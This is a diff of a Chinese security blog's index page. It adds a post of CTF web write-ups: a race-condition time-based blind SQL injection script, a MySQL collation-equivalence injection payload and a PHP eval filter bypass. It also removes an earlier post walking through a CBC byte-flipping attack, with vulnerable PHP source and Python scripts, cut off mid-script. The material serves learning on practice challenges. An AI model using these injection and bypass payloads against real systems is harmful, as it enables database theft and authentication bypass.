@@ -41,7 +41,7 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>31</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>32</strong><br>文章</div></a>
       <a href="/categories"><div><strong>3</strong><br>分类</div></a>
       <a href="/tags"><div><strong>14</strong><br>标签</div></a>
     </div>
@@ -68,6 +68,70 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-solve-me-后续" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/08/16/solve-me-后续/" class="article-date">
+  <time class="post-time" datetime="2018-08-16T04:21:27.000Z" itemprop="datePublished">
+    <span class="post-month">8月</span><br>
+    <span class="post-day">16</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/16/solve-me-后续/">solve me 后续</a>
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h2><p><img src="/images/17/24.png" alt=""><br>题目和之前的一题一样，是一道注入题。分析题目大致流程是这样：<br>当我们输入answer时，首先判断数据库是否有表，如果没有的话就会创建一个新的表，有的话会从表中进行语句的查询。如果count等于12，那么就会销毁表中的数据。接着判断语句查询回显是否为answer，如果不为，那么count数+1。<br>大致流程是这样，不过有个很明显的缺陷就是<strong>count === 12</strong>一般来说这里完全可以使用&gt;= 12来阻止盲注，这里却是使用===来进行阻止。这里就可以卡着11这个节点让count连续加上两次。<strong>我们在连续访问第十一次之后，创建一个sleep(50)的请求，再快速访问一次，快速访问过后count为12，但是之前sleep(50)已经过了count的比较，等sleep(50)回应过后，count就变成了13，接着就能无限次的时间盲注访问了。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">header = &#123;&#125;#这里是你绕过12次后的header值</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    for j in &quot;abcdefghijklmnopqrstuvwxyz1234567890&#123;&#125;_&quot;:</span><br><span class="line">        url = &quot;http://iamslowly.thinkout.rf.gd/?answer=&apos; or case when(answer like &apos;%s%%&apos;) sleep(30) else sleep(0) end --+&quot;%(flag+j)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url=url,headers=header,timeout=29)</span><br><span class="line">            print &quot;i:&quot;,i,&quot;j:&quot;,j,r.content[:10]</span><br><span class="line">        except:</span><br><span class="line">            flag += j</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
+<h2 id="Cheap-lottery"><a href="#Cheap-lottery" class="headerlink" title="Cheap lottery"></a>Cheap lottery</h2><p>这是一道很好的题目，相比之下我宁愿做一道难题也不愿做十道简单的题目，而且最近有些浮躁，一些基础原理回过头没能理会真正的意思。<br>打开题目是一个购买类似彩票的网站，然后题目要求我们通过购买五个数字，全部正确才能得到flag，按照常理来说，这种概率是很小很小的，所以肯定有其他的方式来获得flag。<br>一如既往的先去robots.txt看看，发现有个backup，里面有一个sql文件，给我们提示了lottery表的构造，然后就是源码了，废话不多说开始审计，主要梳理一下流程。<br><img src="/images/17/28.png" alt=""><br>这里值得注意的是name的参数是通过guest_加上我们ip地址，这是为了识别我们购买彩票的用户，而且限定了一个IP只能购买一次彩票，有效的阻止了通过爆破来获取flag。然后判断我们是否选择了五个数字，未选满则会让我们选满五个才能进入下一步的操作。<br><img src="/images/17/29.png" alt=""><br>在通过判断一分钟之内我们没买过彩票之后进入这个语句，服务器通过识别用户ip，创建一个名为admin_ip的用户数据，把自己随机生成的五个数一同插入数据库，接着从url中把字母，=，以及[]全部过滤为空，然后把&amp;所连接的几个参数转变为数组的形式。<br><img src="/images/17/30.png" alt=""><br>通过判断间隔时间是否超过一分钟，如果未超时，那么开始从数据库中查找guest_ip以及admin_ip的数据，比对两者的数字是否一致，只有两者五个数字完全一致才能得到flag。<br>整体看了看流程，能出现的漏洞只有可能是注入以及逻辑漏洞，但是分析流程发现逻辑漏洞存在的可能并不高，数据对接找不到可以利用的点，所以只能是sql注入了，而且在backup中还提示了lottery表的基本构造，所以可以敲定是sql注入，可是注入点在哪里呢？在传参的过程中只有一个是用户可控输入的，那就是lottery，也只能从这里下手，但是服务器在处理参数的时候把字母处理掉了，也就是说在构造guest_ip是不太可能实现的，这该怎么办呢？  </p>
+<p>利用数据库的字符集转换！！！！！！！！<br>参考了大师傅的分析文章，发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</span><br><span class="line">2. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</span><br><span class="line">使用每个数据字段的CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</span><br><span class="line">• 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用character_set_server设定值。</span><br><span class="line">3. 将操作结果从内部操作字符集转换为character_set_results。</span><br></pre></td></tr></table></figure></p>
+<p>这题目的转换就是从utf8-&gt;utf8-&gt;utf8，但是发现好像并没有什么作用，在utf8中我们找不到能替代字母的字符，那也只能继续找能代替字母的字符，参考了离别歌师傅的文章，找到了关键的突破口：<strong>utf8和默认collation字符顺序下不同编码字符被认为相等的特性</strong>，也就是说我们可以使用à来替代a。在mysql的官方文档中说明了这一点：<br><img src="/images/17/31.png" alt=""><br>接着梳理character set与collation的关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql 有两个支持 unicode 的 character set:  </span><br><span class="line">ucs2: 使用 16 bits 来表示一个 unicode 字符。  </span><br><span class="line">utf8: 使用 1~3 bytes 来表示一个 unicode 字符。</span><br></pre></td></tr></table></figure></p>
+<p>接着本地测试:<br><img src="/images/17/32.png" alt=""><br>发现collation默认的是utf8_general_ci，在此规则下大小写是不敏感的，所以也可以解释为什么<strong>admin=AdMin</strong>，继续深入。<br>unicode比对字符串默认顺序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.alphabetic ordering</span><br><span class="line">2.diacritic ordering</span><br><span class="line">3.case ordering.</span><br></pre></td></tr></table></figure></p>
+<p>在2的变音排序时，导致了上述的*A 和 Â 是一个字母。所以到此为止，结合以上的几个原理，有大师傅通过这些原理测试出了一张比对表，参考如下：<br><a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="noopener">http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html</a><br>根据比对的结果可以得出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:%C3%A1%C4%8F%E1%B8%BF%C3%AD%C5%84</span><br><span class="line">guest:%C4%9F%C3%BA%C3%A9%C5%9B%C5%A5</span><br></pre></td></tr></table></figure></p>
+<p>构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = &quot;149.28.21.208&quot;;</span><br><span class="line">$time = time();</span><br><span class="line">$url = &quot;http://cheaplottery.solveme.peng.kr/index.php?lottery[A]=1&apos;),(&apos;%C3%A1%C4%8F%E1%B8%BF%C3%AD%C5%84_$ip&apos;,&apos;$time&apos;,&apos;1,2,3,4,5&apos;),(&apos;%C4%9F%C3%BA%C3%A9%C5%9B%C5%A5_$ip&apos;,&apos;$time&apos;,&apos;1,2,3,4,5&apos;)%23&amp;lottery[B]=&amp;lottery[C]=&amp;lottery[D]=&amp;lottery[E]=&quot;;</span><br><span class="line">echo $url;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>接着在服务器curl一下 <a href="http://cheaplottery.solveme.peng.kr/index.php" target="_blank" rel="noopener">http://cheaplottery.solveme.peng.kr/index.php</a> 就行了。</p>
+<h2 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h2><p><img src="/images/17/25.png" alt=""><br>审题，题目要求我们输入flag参数的值，不传参的话就会如图所示有一个神秘连接，其实就是返回当前时间戳的sha1值，由于第一个条件需要这个长度，那先点击进去测试长度发现为49，所以我们需要构造一个长度为49的payload。接着用正则过滤了\，()，[]，’，.，flag等等要求我们输入的flag通过eval函数输出等于sha1(flag)的值。<br>这题目考的是一个关于eval函数的知识:<br><img src="/images/17/26.png" alt=""><br><img src="/images/17/27.png" alt=""><br>具体原理可以去看eval函数的源码，这里思路就很明确了，构造?&gt;&lt;?=$flag;就行了但是flag被过滤了，这里既然有了eval，那么我们完全可以使用多个语句来构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=$&#123;$a&#125;;?&gt;;  </span><br><span class="line">$a=&apos;alag&apos;;</span><br><span class="line">$a&#123;0&#125;=&apos;f&apos;</span><br></pre></td></tr></table></figure></p>
+<p>接着用无关的东西填充就行了。最终payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://checkviaeval.solveme.peng.kr/?flag=$a=&apos;alag&apos;;$a&#123;0&#125;=&apos;f&apos;;?&gt;&lt;?=$&#123;$a&#125;?&gt;;1111111111111111</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/08/16/solve-me-后续/" data-id="cjv4r4ry7000rmcvjke8uvleo" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-关于代码审计的一些绕过方式" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
@@ -128,7 +192,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/02/关于代码审计的一些绕过方式/" data-id="cjul6evpz002aw8vjqwvf2uf9" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/08/02/关于代码审计的一些绕过方式/" data-id="cjv4r4ryn001emcvjs20sqmlz" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
@@ -187,7 +251,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjul6evpt001xw8vj9du48q27" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjv4r4rzy002jmcvjbi1wgjtl" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>
@@ -254,7 +318,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjul6evpj001gw8vjp2s490a1" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjv4r4ryg0013mcvjvsugy86h" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -321,7 +385,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjul6evp70012w8vjqvz9f4rh" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjv4r4ryd0010mcvjimikd2t7" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -391,7 +455,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjul6evpl001jw8vjrk7cihqp" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjv4r4ryi0015mcvj3ptvgy93" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -452,7 +516,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjul6evpr001uw8vj0jisdewj" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjv4r4ryp001gmcvjnuh8wy4h" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-XSS/">Web XSS</a></li></ul>
@@ -537,7 +601,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjul6evph001ew8vj7u849pqt" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjv4r4ryj0018mcvjdtckd1em" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -596,7 +660,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjul6evp80013w8vj9gfew6of" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjv4r4rye0011mcvjikbvatq1" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -753,70 +817,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjul6evpe0019w8vj2v4td44j" class="article-share-link">分享</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-CBC字节反转攻击" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/05/07/CBC字节反转攻击/" class="article-date">
-  <time class="post-time" datetime="2018-05-07T08:59:19.000Z" itemprop="datePublished">
-    <span class="post-month">5月</span><br>
-    <span class="post-day">07</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/05/07/CBC字节反转攻击/">CBC字节反转攻击</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在比赛中遇到了一道挺有意思的题目，密码学和web的结合让我学到了很多不错的知识，之前也有类似的题目，例如上次的Hash长度拓展攻击，这一次的是CBC字节反转攻击，和它有着异曲同工之妙。  </p>
-<h2 id="CBC加解密原理"><a href="#CBC加解密原理" class="headerlink" title="CBC加解密原理"></a>CBC加解密原理</h2><p><img src="/images/11/1.png" alt=""><br>这是CBC模式加密的流程图，这种加密模式和Hash加密是相似的，<strong>都是前一部分加密的字符用于后一部分加密</strong>，具体流程是初始生成一个IV值，然后把字符按照16字节为一个单位进行分组(不足时用特殊字符填充)和IV值进行异或处理，得到的字符串使用密钥进行加密，然后把加密后的字符作为下一步的IV值，重复操作直到所有字符串加密完成。<br><img src="/images/11/2.png" alt=""><br>解密的过程就不多说了。  </p>
-<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>异或操作(Xor)是对二进制数据进行的运算操作，是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。其运算法则为：<br>a⊕b = (¬a ∧ b) ∨ (a ∧¬b)<br>如果a、b两个值不相同，则异或结果为1。如果a、b两个值相同，异或结果为0。例如A=10010100，B=00100111。那么A Xor B =01001100。如果C = A Xor B ，那么A Xor B Xor C =0并且其中两个异或，都能得到第三者。</p>
-<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p><img src="/images/11/3.png" alt=""><br>这是大手子原理利用的图，这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。基本的理论都讲完了，那么从题目中来理解如何利用的。<br><a href="http://118.190.152.202:8001/" target="_blank" rel="noopener">这是ISCC上的一道题目</a>，打开题目地址，有点类似注入的题目，但是f12过后发现题目给出了源码。打开index.txt发现源码。<br> 我们来理一理这些代码是如何执行的，首先是登入的代码<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">  $username=waf((string)$_POST[&apos;username&apos;]);</span><br><span class="line">  $password=waf((string)$_POST[&apos;password&apos;]);</span><br><span class="line">  if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>如果我们输入了username和password那么页面会先把username转化为字符串形式，这里是为了防止我们通过数组形式来绕过下面的<strong>username=admin</strong>，再waf过滤，这里我们的sql注入是不太可行的。如果我们输入的username为admin那么页面回显错误信息然后直接退出，不为admin那么接着调用了login()以及show_homepage()函数，如果我们通过其他方式给username赋值了，那么跳到check_login()和show_homepage()两个函数上。那我们接着来看这些函数。<br><strong>login()</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function login($info)&#123;</span><br><span class="line">    $iv=get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><strong>show_homepage()</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>整体来说就是，先把我们输入进去的username和password序列化，然后把username的值赋给$_SESSION[“username”]，如果为admin，那么输出flag，如果不为admin，则提示只有admin才能看flag。<br>如果按照上述常规的操作进行登入，那肯定是不行的，这里有一个矛盾，如果我们传入username为admin那么会提示我们<strong>You are not real admin!</strong>，但是我们不传入admin，那么就会提示我们只用admin才能看flag。所以我们需要考虑如何来绕过。所以接着看另一条路的函数<br><strong>check_login</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>这里我们是在没有传入username和password之后所调用的，这里我们需要通过cookies传入一个iv值和一个cipher值，然后cipher经过各种解密，反序列化后把username赋给$_SESSION[‘username’]然后进行身份的验证。<br>分析了源码发现两种登入方式独立开来并没有什么可以利用的东西，但是如果我们把两种方式结合起来，在他们中间那段可进行人为操作的过程中更改数据，那么是可以做到移花接木的。  </p>
-<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p><strong>1 传参抓包</strong><br>把username和password传参过去，注意username不能为admin。<br><img src="/images/11/4.png" alt=""><br><strong>2 更改数据</strong><br>我们这个时候得到了密文和初始的iv值，那么可以通过cbc反转字节攻击来更改我们之前的数据。那么如何利用CBC反转字节呢？<br>我们已知了加密后的文本，以及明文，那我们可以来修改原来的字符串。<br><strong>cipher</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gEc6%2BRRLjY0Bf51gQLMCB1a%2F9wD2106%2BeTzmU%2Baum9Xfin%2BlY%2FF9FfcoPd7%2Buls1Q9sOQJ4zfbnen6c5cxFLcQ%3D%3D</span><br></pre></td></tr></table></figure></p>
-<p>进行处理后变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�G:�K���`@�V����N�y&lt;�S殛�ߊ�c�&#125;�(=���[5C�@�3&#125;�ޟ�9sKq</span><br></pre></td></tr></table></figure></p>
-<p><strong>所对应的明文</strong><br>为了便于理解，我们直接以16字节为一块分开。这是反序列化后的明文。<br>s:2:{s:8:”userna<br>me”;s:5:”xdmin”;<br>s:8:”password”;s<br>:3:”123”;}<br>接下来就是把对应的位置进行更改。<br>假设我们更改的明文为A<br>IV值对应的是B<br>密文为C<br>如果我们构造 <strong>C Xor A Xor “我们所需的字符”</strong>，那是不是就变成了A Xor B Xor A Xor “我们所需的字符”了？这不就等于B Xor “我们所需的字符”了吗？所以我们可以直接利用这个攻击来更改我们的字符。这里直接用大手子的脚本跑把吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">iv_raw=&apos;bR1nkWOLhxJ4rKGJMBF36w%3D%3D&apos;  #这里填写第一次返回的iv值</span><br><span class="line">cipher_raw=&apos;gEc6%2BRRLjY0Bf51gQLMCB1a%2F9wD2106%2BeTzmU%2Baum9Xfin%2BlY%2FF9FfcoPd7%2Buls1Q9sOQJ4zfbnen6c5cxFLcQ%3D%3D&apos;  #这里填写第一次返回的cipher值</span><br><span class="line">print &quot;[*]原始iv和cipher&quot;</span><br><span class="line">print &quot;iv_raw:  &quot; + iv_raw</span><br><span class="line">print &quot;cipher_raw:  &quot; + cipher_raw</span><br><span class="line">print &quot;[*]对cipher解码，进行反转&quot;</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher_raw))</span><br><span class="line">#a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;xdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;&#125;</span><br><span class="line">#s:2:&#123;s:8:&quot;userna</span><br><span class="line">#me&quot;;s:5:&quot;xdmin&quot;;</span><br><span class="line">#s:8:&quot;password&quot;;s</span><br><span class="line">#:3:&quot;12345&quot;;&#125;</span><br><span class="line">xor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord(&apos;x&apos;) ^ ord(&apos;a&apos;)) + cipher[10:]  #请根据你的输入自行更改，原理看上面的介绍</span><br><span class="line">xor_cipher=urllib.quote(base64.b64encode(xor_cipher))</span><br><span class="line">print &quot;反转后的cipher：&quot; + xor_cipher</span><br></pre></td></tr></table></figure></p>
-<p><strong>3 传新参</strong><br>注意这个时候我们就不能把username和password传参过去了，把我们所得到的cipher值和初始的iv值给传过去。<br><img src="/images/11/5.png" alt=""><br><strong>4 修复所更改的数据块</strong><br>这个时候发现我们传的cipher无法正常反序列化，这个时候我们就需要更改iv值来使得cipher能够正常反序列化，原理和上述一致，脚本如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">cipher = &apos;EK9/OgEKt1XNxlpRcDv8+21lIjtzOjU6IntkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&apos;#填写提交后所得的无法反序列化密文</span><br><span class="line">iv = &apos;bR1nkWOLhxJ4rKGJMBF36w%3D%3D&apos;#一开始提交的iv</span><br><span class="line">#cipher = urllib.unquote(cipher)</span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">newIv = &apos;&apos;</span><br><span class="line">right = 